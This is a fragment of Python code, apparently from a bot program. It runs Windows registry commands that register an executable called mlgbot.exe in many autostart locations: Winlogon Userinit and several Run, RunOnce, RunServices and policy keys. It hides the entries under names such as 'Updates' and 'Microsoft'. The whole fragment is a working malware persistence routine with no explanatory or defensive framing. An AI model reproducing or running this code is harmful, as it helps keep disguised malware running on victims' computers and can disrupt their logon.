

os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')

os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Updateslive" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Updates" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""') 
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
os.popen('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
os.popen('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Updates" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
os.popen('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
os.popen('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices" /V "Microsoft" /t REG_SZ /F /D """'+os.getcwd()+'\\mlgbot.exe"""')
